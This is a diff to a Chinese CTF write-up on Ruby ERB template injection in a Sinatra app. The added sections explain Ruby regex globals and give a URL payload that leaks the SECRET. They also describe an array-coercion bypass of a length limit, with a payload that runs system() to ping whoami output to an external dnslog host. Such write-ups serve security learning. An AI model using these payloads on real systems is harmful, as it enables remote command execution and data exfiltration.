@@ -4,7 +4,9 @@
 
 ## 考点
 
-
+* ruby代码审计
+* ruby erb模板注入
+*
 
 ## wp
 
@@ -21,8 +23,6 @@
 ![](<../.gitbook/assets/image (10).png>)
 
 需要密钥才能修改，尝试jwt-crack破解未果
-
-
 
 扫目录，发现`robots.txt`，提示访问`/filebak`，得到源码
 
@@ -114,6 +114,8 @@ def islogin
   end
 end
 ```
+
+### 第一种方法
 
 查一下sinatra是ruby的一个Web框架，erb是ruby自带的模板渲染包，如果输入可控，它会导致模板注入。
 
@@ -209,7 +211,15 @@ prefix.
 .suffix
 ```
 
-payload：`GET /work?name=%3c%25%3d%24'%25%3e&do=%3c%25%3d%24'%25%3e%20is%20working&SECRET=`
+可以得到结论
+
+> $\~ 返回最后一次匹配到的内容
+>
+> $\` 返回最后一次未匹配到内容前面的部分
+>
+> $'  返回最后一次未匹配到内容后面的部分
+
+得到payload：`GET /work?name=%3c%25%3d%24'%25%3e&do=%3c%25%3d%24'%25%3e%20is%20working&SECRET=`
 
 ![](<../.gitbook/assets/image (17).png>)
 
@@ -233,6 +243,36 @@ auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
 cookies[:auth] = auth
 json({title: "success",message: "jkl is good thing"})
 ```
+
+### 第二种方法
+
+前面提到，传入的name不超过7个字符，并且符合这种形式`name=1234567&do=1234567 is working`。而ERB模板渲染的字符`<%=%>`就用了5个，那只剩下两个字符可用。
+
+对于这点，可以使用数组绕过。Ruby中存在数据类型自动强制转换机制。
+
+```ruby
+$a = "mon123"
+$b = Array["aaa","bbb","ccc"]
+puts "$a: #{$a[0,3]}"
+puts "$b: #{$b[0,3]}"
+```
+
+结果
+
+```
+$a: mon
+$b: ["aaa","bbb","ccc"]
+```
+
+如果传入数组，那就从原本的7个字符，变成了7个数组长度
+
+payload：
+
+```
+/work?name[]=<%=system('ping -c 1 `whoami`.xuu1g4.dnslog.cn')%>&name[]=1&name[]=2&name[]=3&name[]=4&name[]=5&name[]=6&do=["<%=system('ping -c 1 `whoami`.xuu1g4.dnslog.cn')%>", "1", "2", "3", "4", "5", "6"] is working
+```
+
+
 
 ## 小结
 
